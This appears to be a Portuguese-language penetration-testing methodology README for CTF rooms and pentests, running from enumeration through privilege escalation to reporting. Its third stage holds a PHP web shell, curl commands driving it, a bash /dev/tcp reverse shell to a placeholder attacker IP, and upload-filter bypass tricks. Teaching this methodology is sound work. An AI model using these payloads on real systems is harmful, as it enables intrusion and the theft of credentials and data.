# Metodologia de investigação

Convenção a seguir sempre que se testa uma room ou projeto novo. Objetivo: nunca saltar etapas e manter tudo registado num documento de investigação por alvo.

## Terminologia

O nome correto (indústria/CTF) para a fase de recolha de dados sobre o alvo é **Enumeration** — não "reconhecimento" isoladamente. As fases seguidas aqui são:

1. **Reconhecimento passivo** — WHOIS e DNS (dig): dados públicos do alvo sem tocar nele diretamente.
2. **Reconhecimento ativo básico** — ping, traceroute/mtr, browser DevTools, telnet/netcat: primeiro contacto direto com o alvo, ainda com ferramentas simples, antes do nmap.
3. **Scanning** — nmap: descobre portas/serviços/versões.
4. **Enumeration** (Etapa 1) — aprofunda cada serviço encontrado: banners, diretórios, API/endpoints, bases de dados. É aqui que se constrói o documento de investigação.
5. **Vulnerability testing** (Etapa 2) — testar classes de falha específicas sobre o que a Enumeration mapeou.
6. **Exploitation** (Etapa 3) — transformar a falha confirmada em acesso (shell, RCE, etc.).

## Etapa 1 — Enumeration

1. **WHOIS** — `whois <IP_ALVO_ou_domínio>`
   Passo passivo, correr antes/em paralelo ao nmap. Para domínio: revela registrar, dono, datas de registo/expiração, nameservers, contactos — pode apontar outros domínios/subdomínios do mesmo dono. Para IP: revela o dono do bloco/ASN e o provedor de hosting, útil para saber se o alvo está numa cloud (AWS/Azure/GCP) ou infraestrutura própria.
   Em rooms de CTF o IP costuma ser interno/CGNAT (o whois não devolve nada útil) — não perder tempo aqui se for o caso, mas correr sempre primeiro para confirmar. Já em alvos reais/bug bounty, este passo é obrigatório antes de tudo o resto.
   Registar no documento de investigação: registrar, dono, ASN/provedor, nameservers e qualquer domínio relacionado encontrado.

2. **DNS (dig)** — só relevante quando há domínio (não só IP):
   ```bash
   dig <dominio>              # registo A por omissão
   dig <dominio> ANY          # todos os registos
   dig <dominio> MX           # servidores de e-mail
   dig <dominio> TXT          # SPF/DKIM/verificações — às vezes vaza infraestrutura
   dig <dominio> NS           # nameservers
   dig axfr @<ns> <dominio>   # tentar zone transfer (raramente aberto, mas vale testar)
   dig -x <IP>                # reverse lookup
   ```
   `dig` é a ferramenta preferida (output mais limpo, mostra TTL, mais fiável para scripting); `nslookup <dominio>` existe como alternativa, mas só usar se `dig` não estiver disponível (ex.: Windows sem instalar nada extra) ou por compatibilidade com documentação antiga.
   Registar no documento de investigação: registos A/MX/TXT/NS relevantes e qualquer subdomínio ou serviço de terceiros (ex.: provedor de e-mail) que apareça.

3. **Reconhecimento ativo básico** — ferramentas simples antes do nmap, dão uma primeira noção do alvo:
   - **Ping** — `ping -c 10 <IP_ALVO>` (Linux/macOS) ou `ping -n 10 <IP_ALVO>` (Windows); `ping -6`/`ping6` para IPv6. Confirma que o alvo está vivo e o TTL da resposta dá pista do SO (~64 = Linux, ~128 = Windows, ~255 = rede/appliance — descontar cada hop do traceroute).
   - **Traceroute / mtr** — `traceroute <IP_ALVO>` (Linux/macOS), `tracert <IP_ALVO>` (Windows), `traceroute -6`/`traceroute6` para IPv6, ou `mtr <IP_ALVO>` para monitorização em tempo real. Mapeia os hops até ao alvo e ajuda a identificar filtragem/firewalls no caminho.
   - **Browser + DevTools** — abrir o serviço HTTP no navegador e inspecionar (`Ctrl+Shift+I` no Linux/Windows, `Option+Command+I` no macOS): headers de resposta, ficheiros JavaScript servidos, detalhes do certificado TLS. Muitas vezes revela a stack/tecnologia antes mesmo do nmap terminar.
   - **Telnet / Netcat** — banner grabbing manual porta a porta:
     ```bash
     nc <IP_ALVO> <PORTA>          # cliente — grab de banner, testar porta
     nc -lvnp <PORTA>              # servidor — usado depois no reverse shell (Etapa 3)
     nc -6 <IP_ALVO> <PORTA>       # IPv6
     telnet <IP_ALVO> <PORTA>      # legado — só quando nc não está disponível
     curl -I http://<IP_ALVO>      # preferir a nc/telnet para banner HTTP (mais seguro/flexível)
     ```
     `nc`/`curl` são preferíveis a `telnet` para banner HTTP; `telnet` fica só para compatibilidade com serviços legados ou docs antigas.
   - Registar no documento de investigação: TTL/SO inferido, hops relevantes do traceroute, achados do DevTools (tecnologia, certificado) e banners obtidos por porta.

4. **Scanning (Nmap)** — `nmap -sV -sC -oN scan.txt <IP_ALVO>` (ou `-sCV`, equivalente)
   Descobre portas abertas, versões de serviços, e normalmente já revela também bases de dados e outras aplicações a correr (ex.: MySQL, Redis, SMB, etc.). Tudo o que aparecer aqui vai para o documento de investigação, não só o serviço web.
   Usar sempre `-oN <ficheiro>` para gravar o output em disco — poupa tempo em relatórios e permite voltar atrás sem correr o scan outra vez. Nos scripts deste repo (`steps/1_nmap.sh`) isto já é automático: grava em `room/<nome>/scans/nmap.txt`.

5. **Criar/atualizar o documento de investigação**
   Depois do scanning e da inspeção manual (passos 1-4), registar tudo o que já se sabe (ver template abaixo).

6. **Content discovery — ficheiros convencionais** (correr **antes** do ffuf)
   Web servers expõem por convenção ficheiros que muitas vezes revelam mais do que o dono pretendia. Verificar manualmente é rápido, silencioso e poupa fuzzing — deve ser o primeiro passo de descoberta de conteúdo, antes do brute-force.
   ```bash
   tools-general/content-discovery/check-files.sh <IP_ou_URL_ALVO>
   ```
   O script faz `curl` aos ficheiros mais úteis e imprime o `robots.txt`/`sitemap.xml` na íntegra:
   - **`robots.txt`** — a lista de `Disallow:` são diretórios que o dono não quer indexados (ex.: `/staff-portal`, `/admin`). É só uma guideline para bots, **não** um controlo de acesso: os caminhos continuam acessíveis diretamente e servem de mapa de sítios interessantes.
   - **`sitemap.xml`** (e `sitemap_index.xml`) — ao contrário do robots, lista as páginas que o dono *quer* indexadas; às vezes inclui páginas de staging, conteúdo antigo ou URLs difíceis de alcançar pela navegação normal.
   - **`/.well-known/security.txt`**, **`humans.txt`** — contactos/nomes da equipa (úteis para user enumeration).
   - **`.git/HEAD`**, **`.env`**, **`.htaccess`**, **`.DS_Store`** — fonte/segredos/config potencialmente expostos (aprofundar na Etapa 2, item 7).
   - **Headers** `Server` / `X-Powered-By` — confirmam a stack.
   Registar no documento de investigação os caminhos revelados pelo robots/sitemap e qualquer ficheiro sensível encontrado. Os caminhos são pistas — testar cada um diretamente no browser.

7. **Directory Enumeration** — `ffuf` / `gobuster`
   Para o que *não* está listado no robots/sitemap: procurar diretórios e ficheiros escondidos por brute-force. É a parte *automated* do content discovery (o item 6 é a parte manual).
   ```bash
   tools-general/directory-enumeration/gobuster-dir.sh <IP_ou_URL_ALVO>
   ```
   O gobuster tem três modos: **`dir`** (diretórios/ficheiros — coberto pelo script), **`dns`** (subdomínios) e **`vhost`** (virtual hosts no mesmo IP). Ver os comandos de `dns`/`vhost` em [tools-general/directory-enumeration/README.md](tools-general/directory-enumeration/README.md). A qualidade da wordlist é crítica — o SecLists (`Discovery/Web-Content/common.txt`, `directory-list-2.3-medium.txt`) cobre a maioria dos casos.
   Atualizar o documento de investigação com o que for encontrado (novas rotas, ficheiros de config, painéis, subdomínios, etc.).

8. **API Enumeration**
   Verificar se existe API (`/api`, `/graphql`, Swagger/OpenAPI, etc.) e mapear os endpoints encontrados.

9. **Atualizar o documento de investigação continuamente**
   Cada nova descoberta (vulnerabilidade, credencial, versão, endpoint) entra no documento assim que é confirmada — não só no fim.

10. **Searchsploit** — pesquisar exploits conhecidos para cada serviço/versão identificado até aqui, antes de passar à Etapa 2:
   ```bash
   searchsploit <serviço> <versão>
   # ex.: searchsploit php 8.1.0
   # ex.: searchsploit apache 2.4.49
   ```
   Correr para cada versão de serviço encontrada no nmap (e no banner/curl). Um resultado exato de versão costuma ser exploit direto — vale mais a pena confirmar isso primeiro do que ir logo caçar falhas manualmente na Etapa 2.
   `searchsploit -x <caminho>` mostra o código do exploit; `searchsploit -m <caminho>` copia-o para a pasta atual.
   Guardar no documento de investigação qualquer exploit relevante encontrado (título, Exploit-DB ID, caminho local).

## Etapa 2 — Busca de falhas

Com a superfície mapeada (endpoints, rotas, parâmetros), testar sistematicamente uma classe de falha de cada vez, começando pela mais provável dado o que foi encontrado na Etapa 1. Para cada endpoint/parâmetro com IDs, sessões ou input do utilizador, verificar pelo menos:

1. **IDOR** — trocar IDs/referências (ex.: `?id=1` → `?id=2`, ou o ID de outro utilizador) e ver se dá acesso a dados que não deviam ser teus.
2. **Autenticação / controlo de acesso** — aceder a rotas autenticadas sem sessão, ou com sessão de outro perfil (ex.: user vs admin).
3. **Injeção (SQLi/Command Injection)** — parâmetros que entram em queries ou comandos do sistema.
4. **XSS** — inputs refletidos ou armazenados sem sanitização.
5. **LFI/RFI/Path Traversal** — parâmetros que apontam para ficheiros (`?file=`, `?page=`).
6. **SSRF** — parâmetros que fazem o servidor pedir uma URL.
7. **Exposição de ficheiros/segredos** — `.env`, `.git`, backups, ficheiros de config acessíveis diretamente.
8. **Fluxo de reset de senha** — uma das features mais frequentemente mal implementadas, porque é complexa e os devs costumam cortar caminho. Verificar:
   - o token de reset é previsível, sequencial, ou reutilizável após já ter sido usado?
   - o token expira? consegue ser usado depois de expirado ou depois de já ter sido consumido?
   - o endpoint aceita trocar o e-mail/username do request para resetar a senha de outro utilizador (IDOR no próprio fluxo)?
   - a resposta do "esqueci a senha" diferencia utilizador existente vs inexistente (user enumeration)?
   - falta rate limiting no envio de tokens ou na tentativa de adivinhar o token?
   - o token vaza (URL no Referer, log, resposta da API, link por HTTP em vez de HTTPS)?
   - a sessão antiga continua válida depois do reset (não invalida sessões existentes)?
9. **Upload de ficheiros** — uma feature poderosa (ainda mais em painel de admin) e caminho comum para RCE. Verificar:
   - a restrição de tipo é só client-side? (atributo `accept` do `<input>`, validação em JS) — remover/editar no DevTools ou mandar o pedido direto (Burp/curl) e ver se o servidor aceita mesmo assim.
   - qual o caminho de destino do upload (ex.: `/uploads/documents/`)? os ficheiros lá ficam acessíveis diretamente e são executados pelo servidor?
   - a validação do servidor é por extensão (blocklist) ou por conteúdo (magic bytes/MIME real)? testar extensão claramente perigosa primeiro (`.php`) para confirmar se há blocklist.
   - se `.php` for bloqueado, tentar extensões alternativas que o Apache/servidor ainda processa como código: `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.inc`, `.asp`/`.aspx`/`.asa` (IIS), `.jsp`/`.jspx` (Tomcat), conforme a stack identificada no nmap.
   - outros bypasses a testar: double extension (`shell.php.jpg`), null byte (`shell.php%00.jpg`), maiúsculas (`shell.PHP`), content-type do multipart forjado, magic bytes de imagem + payload PHP no fim do ficheiro (polyglot).
   - depois de um upload aceite, confirmar execução visitando o ficheiro diretamente no caminho de destino (ex.: `/uploads/documents/test.phtml`).
   - payloads prontos para este teste em [tools-general/upload-bypass/](tools-general/upload-bypass/) (`test.txt`, `phpinfo.phtml`, `shell.phtml`).

Cada falha testada (encontrada ou não) fica registada na secção "Testes de falhas" do documento de investigação, para não repetir trabalho nem esquecer o que já foi tentado.

## Etapa 3 — De upload a shell interativa

Quando o bypass de upload (item 9 da Etapa 2) confirmar execução de código, o passo seguinte é consolidar isso numa shell interativa:

1. **Web shell** — subir um ficheiro pequeno que executa comandos via parâmetro HTTP, usando a mesma extensão que passou no bypass (ex.: `.phtml`). Já existe pronto em [tools-general/upload-bypass/shell.phtml](tools-general/upload-bypass/shell.phtml):
   ```php
   <?php
   if(isset($_GET['cmd'])) {
       echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
   }
   ?>
   ```
   Para confirmar execução sem já lançar comandos, usar antes [tools-general/upload-bypass/phpinfo.phtml](tools-general/upload-bypass/phpinfo.phtml).

2. **Confirmar RCE** — chamar o ficheiro no caminho de upload com comandos básicos:
   ```bash
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=whoami"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=id"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=hostname"
   curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=uname+-a"
   ```

3. **Enumeração inicial via web shell** — ler ficheiros sensíveis antes de escalar para shell interativa (ex.: `/etc/passwd` para listar utilizadores, ficheiros de config da app para credenciais de BD).

4. **Reverse shell** — o web shell é limitado (um comando por request, sem sessão interativa, caracteres especiais complicam). Escalar para reverse shell:
   - Listener no atacante: `nc -lvnp 4444`
   - Payload via web shell (URL-encoded para evitar problemas com caracteres especiais):
     ```bash
     curl "http://<IP_ALVO>/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP_ATACANTE>/4444+0>%261'"
     ```
   - Confirmar a shell interativa recebida no listener (`whoami`, `id`).

5. **Registar no documento de investigação**: caminho do web shell, comandos confirmados, utilizador obtido (tipicamente `www-data`/`apache`, sem privilégios), e ficheiros sensíveis já lidos.

## Etapa 4 — Escalada de privilégios

Nem todo acesso inicial já vem com privilégios máximos. O exploit (via Metasploit ou não) dá o acesso com os poderes do processo/utilizador que foi comprometido (ex.: `www-data`, `webmaster`) — a escalada a root/SYSTEM é um passo à parte, não automático.

Quando o acesso vier de uma sessão do **Metasploit** e não for já root:

1. **Colocar a sessão atual em segundo plano** — na shell ativa, `Ctrl+Z` e confirmar com `y`/`yes`. O Metasploit guarda a sessão (`Backgrounding session 1...`).

2. **Carregar o Local Exploit Suggester**:
   ```
   use post/multi/recon/local_exploit_suggester
   ```

3. **Apontar para a sessão a analisar** (normalmente `1`):
   ```
   set SESSION 1
   ```

4. **Correr a análise**:
   ```
   run
   ```
   O módulo testa dezenas de vulnerabilidades locais conhecidas e devolve uma lista dos exploits que provavelmente funcionam para virar root/SYSTEM naquela máquina.

5. **Escolher e correr um dos exploits sugeridos** (`use <exploit sugerido>`, `set SESSION 1`, `run`) e confirmar o novo utilizador (`getuid`/`id`).

6. **Registar no documento de investigação**: utilizador inicial, exploit de privesc usado, utilizador final obtido.

> Lembrete: isto é uma ferramenta de automação da busca, não uma garantia — se nada da lista funcionar, volta à enumeração manual do sistema (kernel, SUID, cron jobs, sudo -l, etc.).

## Etapa 5 — Relatório final

Com o `investigacao.md` completo, o pentest termina com um relatório apresentável — não é o mesmo documento da investigação (esse é o rascunho de trabalho; o relatório é o entregável). Usar o template em [RELATORIO-TEMPLATE.md](RELATORIO-TEMPLATE.md): capa, sumário executivo, tabela de vulnerabilidades por severidade, e uma secção detalhada (descrição, passos de exploração, recomendação) por vulnerabilidade encontrada.

## Documento de investigação

Um ficheiro `investigacao.md` por room/projeto, em `room/<nome>/investigacao.md`, com esta estrutura mínima:

```markdown
# Investigação — <nome da room>

## Alvo
- IP:
- Domínio(s):

## WHOIS
- Registrar:
- Dono / organização:
- ASN / provedor de hosting:
- Nameservers:
- Domínios/subdomínios relacionados:

## DNS (dig)
- A:
- MX:
- TXT:
- NS:
- Zone transfer (axfr) funcionou?:

## Reconhecimento ativo básico
- Ping (TTL / SO inferido):
- Traceroute/mtr (hops relevantes):
- Browser DevTools (tecnologia, certificado):
- Banners via telnet/nc (porta → banner):

## Portas e serviços (nmap)
| Porta | Serviço | Versão |
|-------|---------|--------|
|       |         |        |

## Bases de dados / outras aplicações
-

## Servidores web
- Servidor:
- Versão:
- Headers relevantes:

## Content discovery (ficheiros convencionais)
- robots.txt (Disallow / caminhos revelados):
- sitemap.xml (páginas listadas):
- .well-known/security.txt / humans.txt:
- .git / .env / .htaccess expostos?:

## Directory enumeration
-

## API / Endpoints
-

## Exploits conhecidos (searchsploit)
| Serviço/Versão | Exploit encontrado | Exploit-DB ID |
|----------------|---------------------|----------------|
|                |                     |                |

## Testes de falhas (Etapa 2)
| Tipo | Onde foi testado | Resultado |
|------|-------------------|-----------|
| IDOR |                   |           |
| Reset de senha |             |           |
| Upload de ficheiros |       |           |

## Shell / RCE (Etapa 3)
- Web shell (caminho):
- Comandos confirmados:
- Utilizador obtido:
- Reverse shell (IP:porta):
- Ficheiros sensíveis lidos:

## Escalada de privilégios (Etapa 4)
- Utilizador inicial:
- local_exploit_suggester rodado? (S/N):
- Exploits sugeridos:
- Exploit de privesc usado:
- Utilizador final obtido:

## Vulnerabilidades identificadas
-

## Credenciais / segredos encontrados
-

## Próximos passos
-
```

Ver [CLAUDE.md](CLAUDE.md) para a estrutura geral do repositório e convenções dos scripts.
